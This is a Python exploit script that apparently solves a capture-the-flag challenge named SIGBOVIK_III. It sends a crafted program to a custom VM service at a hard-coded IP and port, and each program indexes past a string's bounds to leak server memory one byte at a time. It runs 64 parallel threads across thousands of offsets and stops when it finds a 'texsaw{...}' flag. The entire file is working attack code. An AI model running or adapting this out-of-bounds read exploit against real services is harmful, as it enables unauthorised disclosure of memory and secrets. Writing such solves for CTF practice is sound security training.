#!/usr/bin/env python3
import argparse
import socket
import sys
import threading
from typing import Optional

FLAG_PREFIX = b"texsaw{"


def build_program(idx: int) -> bytes:
    return (
        "LOAD 0\n"
        "STRING\n"
        "GET 0\n"
        f"LOAD {idx}\n"
        "STRINGREF\n"
        "DONE\n"
    ).encode()


def recv_all(sock: socket.socket, timeout: float) -> bytes:
    sock.settimeout(timeout)
    chunks = []
    while True:
        try:
            data = sock.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
    return b"".join(chunks)


def leak_byte_once(host: str, port: int, idx: int, timeout: float) -> Optional[int]:
    payload = build_program(idx)
    with socket.create_connection((host, port), timeout=timeout) as sock:
        sock.sendall(payload)
        try:
            sock.shutdown(socket.SHUT_WR)
        except OSError:
            pass
        out = recv_all(sock, timeout)
    if len(out) >= 3 and out[:2] == b"#\\":
        return out[2]
    return None


class Scanner:
    def __init__(
        self,
        host: str,
        port: int,
        start: int,
        end: int,
        timeout: float,
        retries: int,
        workers: int,
        max_flag_len: int,
        report_every: int,
    ):
        self.host = host
        self.port = port
        self.start = start
        self.end = end
        self.timeout = timeout
        self.retries = retries
        self.workers = workers
        self.max_flag_len = max_flag_len
        self.report_every = report_every

        self.next_offset = start
        self.offset_lock = threading.Lock()
        self.state_lock = threading.Lock()
        self.cache_lock = threading.Lock()

        self.checked = 0
        self.found_flag: Optional[str] = None
        self.cache: dict[int, Optional[int]] = {}

    def leak_byte(self, idx: int) -> Optional[int]:
        with self.cache_lock:
            if idx in self.cache:
                return self.cache[idx]

        value: Optional[int] = None
        for _ in range(self.retries):
            try:
                value = leak_byte_once(self.host, self.port, idx, self.timeout)
                if value is not None:
                    break
            except (socket.timeout, TimeoutError, ConnectionError, OSError):
                continue

        with self.cache_lock:
            self.cache[idx] = value
        return value

    def verify_prefix(self, start: int) -> bool:
        for i, want in enumerate(FLAG_PREFIX):
            got = self.leak_byte(start + i)
            if got != want:
                return False
        return True

    def leak_flag_from(self, start: int) -> Optional[str]:
        leaked = bytearray()
        for i in range(self.max_flag_len):
            b = self.leak_byte(start + i)
            if b is None:
                return None
            leaked.append(b)
            if b == ord("}"):
                break

        if not leaked.startswith(FLAG_PREFIX) or leaked[-1] != ord("}"):
            return None
        try:
            return leaked.decode("ascii")
        except UnicodeDecodeError:
            return leaked.decode("latin1", errors="ignore")

    def get_next_offset(self) -> Optional[int]:
        with self.offset_lock:
            if self.next_offset >= self.end:
                return None
            v = self.next_offset
            self.next_offset += 1
            return v

    def mark_checked(self, offset: int) -> None:
        with self.state_lock:
            self.checked += 1
            if self.checked % self.report_every == 0:
                print(f"[*] checked={self.checked} current_offset={offset}")

    def worker(self) -> None:
        while True:
            with self.state_lock:
                if self.found_flag is not None:
                    return
            offset = self.get_next_offset()
            if offset is None:
                return

            first = self.leak_byte(offset)
            self.mark_checked(offset)
            if first != FLAG_PREFIX[0]:
                continue
            if not self.verify_prefix(offset):
                continue

            flag = self.leak_flag_from(offset)
            if flag and flag.startswith("texsaw{") and flag.endswith("}"):
                with self.state_lock:
                    if self.found_flag is None:
                        self.found_flag = flag
                        print(f"[+] Found flag at offset {offset}: {flag}")
                return

    def run(self) -> Optional[str]:
        threads = [threading.Thread(target=self.worker, daemon=True) for _ in range(self.workers)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        return self.found_flag


def main() -> int:
    parser = argparse.ArgumentParser(description="Exploit SIGBOVIK_III and print flag")
    parser.add_argument("--host", default="143.198.163.4")
    parser.add_argument("--port", type=int, default=1902)
    parser.add_argument("--start", type=int, default=0)
    parser.add_argument("--end", type=int, default=30000)
    parser.add_argument("--workers", type=int, default=64)
    parser.add_argument("--timeout", type=float, default=0.8)
    parser.add_argument("--retries", type=int, default=2)
    parser.add_argument("--max-flag-len", type=int, default=160)
    parser.add_argument("--report-every", type=int, default=500)
    args = parser.parse_args()

    print(f"[*] Scanning offsets [{args.start}, {args.end}) on {args.host}:{args.port}")
    scanner = Scanner(
        host=args.host,
        port=args.port,
        start=args.start,
        end=args.end,
        timeout=args.timeout,
        retries=args.retries,
        workers=args.workers,
        max_flag_len=args.max_flag_len,
        report_every=args.report_every,
    )
    flag = scanner.run()
    if flag is None:
        print("[-] Flag not found in this range. Increase --end / --retries.")
        return 1
    print(flag)
    return 0


if __name__ == "__main__":
    sys.exit(main())
